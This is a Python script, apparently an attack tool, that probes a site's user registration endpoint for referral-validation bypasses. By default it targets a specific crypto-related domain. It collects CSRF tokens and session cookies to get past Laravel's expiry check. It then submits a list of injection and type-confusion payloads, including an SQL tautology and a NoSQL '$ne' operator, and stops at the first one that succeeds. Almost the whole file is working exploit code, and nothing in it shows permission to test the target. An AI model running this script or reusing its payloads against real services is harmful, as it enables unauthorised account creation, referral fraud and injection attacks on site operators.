#!/usr/bin/env python3
"""
REFERRAL BYPASS & FUZZING PROBE v7.4
Evaluates multi-target registration endpoints for referral validation bypasses.
Features:
- Dynamic target ingestion (No hardcoded domains)
- Automated pre-flight CSRF token harvesting (Bypasses Laravel 419 Page Expired checks)
- Robust terminal color output mapping
"""
import sys
import re
import json
from modules.transport import SecureTransport

COLORS = {
    "RED": "\033[91m",
    "GREEN": "\033[92m",
    "YELLOW": "\033[93m",
    "CYAN": "\033[96m",
    "MAGENTA": "\033[95m",
    "GRAY": "\033[90m",
    "PURPLE": "\033[95m",
    "RESET": "\033[0m",
}

def log(msg, color="GREEN"):
    ansi_color = COLORS.get(color, color)
    sys.stdout.write(f"{ansi_color}{msg}{COLORS['RESET']}\n")
    sys.stdout.flush()

def extract_csrf_token(html_body):
    match = re.search(r'<input[^>]*name=["\']_token["\'][^>]*value=["\']([^"\']+)["\']', html_body, re.I)
    if match:
        return match.group(1)
    meta_match = re.search(r'<meta[^>]*name=["\']csrf-token["\'][^>]*content=["\']([^"\']+)["\']', html_body, re.I)
    if meta_match:
        return meta_match.group(1)
    return None

def audit_referral_logic(target_host=None):
    target_url = target_host if target_host else "https://cryptobytes.online"
    if "://" not in target_url:
        target_url = "https://" + target_url
    
    registration_endpoint = "/user/register"
    transport = SecureTransport(target_url)
    
    log(f"[*] Pre-flight request: Harvesting CSRF token and session cookies from {target_url}{registration_endpoint}...", "CYAN")
    get_status, get_headers, get_body = transport.request("GET", registration_endpoint)
    
    csrf_token = extract_csrf_token(get_body)
    if csrf_token:
        log(f"[+] Successfully harvested CSRF token: {csrf_token[:16]}...", "GREEN")
    else:
        log("[!] Warning: Could not locate explicit CSRF token in DOM. Proceeding with session cookies only.", "YELLOW")

    bypass_payloads = [
        {"name": "Null Value Bypass", "ref": None},
        {"name": "Boolean True Bypass", "ref": True},
        {"name": "Empty String Bypass", "ref": ""},
        {"name": "NoSQL Operator Bypass", "ref": {"$ne": None}},
        {"name": "Admin Default Code", "ref": "ADMIN001"},
        {"name": "System Root Code", "ref": "ROOT"},
        {"name": "SQL Tautology", "ref": "' OR '1'='1"},
        {"name": "Type Confusion (Array)", "ref": ["5702185"]}
    ]

    base_registration_data = {
        "name": "RedTeam Auditor",
        "email": "redteam.audit@cryptobytes.online",
        "password": "SecureTestPassword123!",
        "password_confirmation": "SecureTestPassword123!",
        "terms": "1"
    }

    if csrf_token:
        base_registration_data["_token"] = csrf_token

    log(f"\n[*] Initiating referral validation audit against {target_url}{registration_endpoint}...\n", "PURPLE")

    for test in bypass_payloads:
        payload = base_registration_data.copy()
        payload["referral"] = test["ref"]
        payload["ref"] = test["ref"]

        status, headers, body = transport.request("POST", registration_endpoint, payload=payload)
        
        log(f"[-] Test: {test['name']} (Payload: {test['ref']})", "CYAN")
        log(f"    -> Status: {status}", "YELLOW" if status == 419 else "GREEN")
        log(f"    -> Response Snippet: {body[:150].strip()}", "GRAY")

        if status in [200, 201, 302] and "error" not in body.lower() and "419" not in str(status):
            log(f"[!] SUCCESS! Referral validation bypassed on {target_url} using: {test['name']}", "RED")
            break

if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else "https://cryptobytes.online"
    audit_referral_logic(target)
